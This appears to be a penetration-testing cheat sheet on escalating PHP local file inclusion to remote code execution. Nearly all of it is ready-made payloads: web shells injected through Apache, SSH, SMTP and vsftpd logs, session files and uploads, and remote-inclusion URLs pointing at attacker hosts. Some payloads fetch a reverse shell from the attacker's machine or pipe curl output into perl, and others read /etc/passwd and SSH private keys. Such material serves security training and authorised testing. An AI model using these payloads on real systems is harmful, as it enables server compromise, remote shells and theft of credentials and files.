# LFI to RCE

## Log Poisoning

### LFI to RCE via Apache Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 

 

Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 



Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id

OR

python -m SimpleHTTPServer 9000 



Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 


file_put_contents('shell.php')                                // What it will be saved locally on the target
file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called

Execute PHP Reverse Shell: http//10.10.10.10/shell.php

```

### LFI to RCE via SSH Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 



Payload: ssh <?php system($_GET['c']);?>@<target_ip>


Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id

```

### LFI to RCE via SMTP Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 



telnet <target_ip> 25 // Replace with the target IP
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&c=id
```

### Log Files

```http
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_lo
```

## Proc Environ Injection

{% embed url="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/" %}

Our main target is to inject the `/proc/self/environ` file from the HTTP Header: `User-Agent`. This file hosts the initial environment of the Apache process. Thus, the environmental variable `User-Agent` is likely to appear there.

<figure><img src="../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>



## Remote File Inclusion

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion#remote-file-inclusion" %}

In php this is disable by default because **`allow_url_include`** is **Off.** It must be **On** for it to work, and in that case you could include a PHP file from your server and get RCE:

```
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

If for some reason **`allow_url_include`** is **On**, but PHP is **filtering** access to external webpages, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), you could use for example the data protocol with base64 to decode a b64 PHP code and egt RCE:

Copy

```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```

In the previous code, the final `+.txt` was added because the attacker needed a string that ended in `.txt`, so the string ends with it and after the b64 decode that part will return just junk and the real PHP code will be included (and therefore, executed).

Another example **not using the `php://` protocol** would be:

Copy

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```

## Via Email

**Send a mail** to a internal account (user@localhost) containing your PHP payload like `<?php echo system($_REQUEST["cmd"]); ?>` and try to include to the mail of the user with a path like **`/var/mail/<USERNAME>`** or **`/var/spool/mail/<USERNAME>`**

## Via /proc/\*/fd/\* <a href="#via-proc-fd" id="via-proc-fd"></a>

1. Upload a lot of shells (for example : 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), with $PID = PID of the process (can be brute forced) and $FD the file descriptor (can be brute forced too)

## Via /proc/self/environ <a href="#via-proc-self-environ" id="via-proc-self-environ"></a>

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## Via upload <a href="#via-upload" id="via-upload"></a>

If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).

```
http://example.com/index.php?page=path/to/uploaded/file.png
```

In order to keep the file readable it is best to inject into the metadata of the pictures/doc/pdf

## Via Zip fie upload <a href="#via-zip-fie-upload" id="via-zip-fie-upload"></a>

Upload a ZIP file containing a PHP shell compressed and access:

```
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```

## Via PHP sessions <a href="#via-php-sessions" id="via-php-sessions"></a>

Check if the website use PHP Session (PHPSESSID)

```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

In PHP these sessions are stored into _/var/lib/php5/sess\\_\[PHPSESSID]\_ files

```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Set the cookie to `<?php system('cat /etc/passwd');?>`

```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Use the LFI to include the PHP session file

```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```

## Via ssh <a href="#via-ssh" id="via-ssh"></a>

If ssh is active check which user is being used (/proc/self/status & /etc/passwd) and try to access **\<HOME>/.ssh/id\_rsa**

## **Via** **vsftpd** _**logs**_ <a href="#via-vsftpd-logs" id="via-vsftpd-logs"></a>

The logs for the FTP server vsftpd are located at _**/var/log/vsftpd.log**_. In the scenario where a Local File Inclusion (LFI) vulnerability exists, and access to an exposed vsftpd server is possible, the following steps can be considered:

1. Inject a PHP payload into the username field during the login process.
2. Post injection, utilize the LFI to retrieve the server logs from _**/var/log/vsftpd.log**_.

## Via php base64 filter (using base64) <a href="#via-php-base64-filter-using-base64" id="via-php-base64-filter-using-base64"></a>

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64.You can use that to bypass the file extension check: if you supply base64 that ends with ".php", and it would just ignore the "." and append "php" to the base64. Here is an example payload

```
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

## Via php filters (no file needed) <a href="#via-php-filters-no-file-needed" id="via-php-filters-no-file-needed"></a>

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.

[LFI2RCE via PHP Filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

## Via segmentation fault <a href="#via-segmentation-fault" id="via-segmentation-fault"></a>

**Upload** a file that will be stored as **temporary** in `/tmp`, then in the **same request,** trigger a **segmentation fault**, and then the **temporary file won't be deleted** and you can search for it.

[LFI2RCE via Segmentation Fault](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault)

## Via Nginx temp file storage <a href="#via-nginx-temp-file-storage" id="via-nginx-temp-file-storage"></a>

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:

[LFI2RCE via Nginx temp files](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files)

## Via PHP\_SESSION\_UPLOAD\_PROGRESS <a href="#via-php_session_upload_progress" id="via-php_session_upload_progress"></a>

If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**. You could abuse this to get RCE:

[LFI2RCE via PHP\_SESSION\_UPLOAD\_PROGRESS](https://book.hacktricks.xyz/pentesting-web/file-inclusion/via-php\_session\_upload\_progress)

## Via temp file uploads in Windows <a href="#via-temp-file-uploads-in-windows" id="via-temp-file-uploads-in-windows"></a>

If you found a **Local File Inclusion** and and the server is running in **Windows** you might get RCE:

[LFI2RCE Via temp file uploads](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-temp-file-uploads)

## Via `pearcmd.php` + URL args <a href="#via-pearcmd.php--url-args" id="via-pearcmd.php--url-args"></a>

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument.

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:

```
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```

The following abuses a CRLF vuln to get RCE (from [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):

```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```

## Via phpinfo() (file\_uploads = on) <a href="#via-phpinfo-file_uploads-on" id="via-phpinfo-file_uploads-on"></a>

If you found a **Local File Inclusion** and a file exposing **phpinfo()** with file\_uploads = on you can get RCE:

[LFI2RCE via phpinfo()](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

#### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure <a href="#via-compress.zlib--php_stream_prefer_studio--path-disclosure" id="via-compress.zlib--php_stream_prefer_studio--path-disclosure"></a>

If you found a **Local File Inclusion** and you **can exfiltrate the path** of the temp file BUT the **server** is **checking** if the **file to be included has PHP marks**, you can try to **bypass that check** with this **Race Condition**:

[LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure)

## Via eternal waiting + bruteforce <a href="#via-eternal-waiting--bruteforce" id="via-eternal-waiting--bruteforce"></a>

If you can abuse the LFI to **upload temporary files** and make the server **hang** the PHP execution, you could then **brute force filenames during hours** to find the temporary file:

[LFI2RCE via Eternal waiting](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-eternal-waiting)

## To Fatal Error <a href="#to-fatal-error" id="to-fatal-error"></a>

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

**I don't know how is this useful but it might be.** _Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="https://book.hacktricks.xyz/~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252FJmw2mcXj7BplxfReaLxL%252Fimage.png%3Falt%3Dmedia%26token%3D898f2793-e077-44ee-88ef-6051474e49af&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=308cc3b6&#x26;sv=1" alt=""><figcaption></figcaption></figure>
